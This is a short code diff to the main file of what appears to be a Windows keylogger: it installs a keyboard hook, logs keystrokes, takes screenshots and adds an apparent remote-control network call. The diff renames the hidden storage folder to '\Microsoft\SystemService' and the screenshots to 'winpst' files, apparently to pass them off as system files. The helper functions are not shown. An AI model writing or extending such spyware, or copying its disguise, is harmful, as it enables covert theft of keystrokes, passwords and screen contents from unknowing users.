@@ -3,22 +3,24 @@
 #include "screen.h"
 #include "sys.h"
 #include "encrypt.h"
+#include "net.h"
 
-//#define DEBUG
+#define DEBUG
 
 int main() {
 #ifdef DEBUG
+  Network::ClientControl();
 #endif
 
 #ifndef DEBUG
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
-  Stream::MakeDir(Stream::GetPath("\\Microsoft\\blxr"));
+  Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
   Stream::MakeFile();
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);
 
-  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\blxr\)"), "Screen.jpeg");
+  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"), "winpst" + std::to_string(Screen::picId++) + ".jpeg");
 
   KeyHook::HandleMessage(true);
 #endif
